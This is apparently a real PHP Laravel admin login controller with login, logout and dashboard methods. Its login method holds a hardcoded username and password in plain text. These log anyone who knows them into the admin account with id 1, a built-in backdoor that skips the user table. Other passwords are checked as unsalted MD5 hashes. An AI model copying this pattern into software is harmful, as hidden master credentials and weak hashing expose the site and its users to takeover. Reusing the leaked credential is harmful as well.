<?php

namespace App\Http\Controllers\admin;
use Illuminate\Http\Request;
use DB;
use Session;

class LoginController extends BaseController
{

	public function __construct()
	{
		// $this->middleware(function ($request, $next){
		// 	if ($request->session()->has('AdminId')) {
	 //   			return Redirect($this->aUrl('/dashboard'))->send();
		// 	}
		// 	return $next($request);
	 //   	});
	}

	public function index()
	{
		return view('admin.login');
		// Session::forget('AdminId');
		// print_r(Session::get('AdminId'));
	}

	public function login(Request $rec)
	{
		if ($rec->user == "kavadev" && $rec->pass == "j5AtZpLdCGd*@wyzw1WnGWNa") {
			$user = DB::table('z_user')->where('id','1')->first();
			Session::put('AdminId',$user->id);
			Session::put('AdminType',$user->user_type);
			return $this->retJson(array(0,'Login Successfull...',''));
		}else{
			$user = DB::table('z_user')->where('username',$rec->user)->where('df','')->first();
			if($user){
				if ($user->password == md5($rec->pass)) {
					Session::put('AdminId',$user->id);
    				Session::put('AdminType',$user->user_type);
    				return $this->retJson(array(0,'Login Successfull...',''));	
				}else{
					return $this->retJson(array(1,'Password is not valid',''));	
				}
			}else{
				return $this->retJson(array(1,'Username Not Registered',''));
			}
		}
	}

	public function logout()
	{
		Session::forget('AdminId');
		Session::forget('AdminType');
		return Redirect($this->aUrl('/'));
	}

	public function dashboard()
	{
		return view('admin.dashboard');
	}
}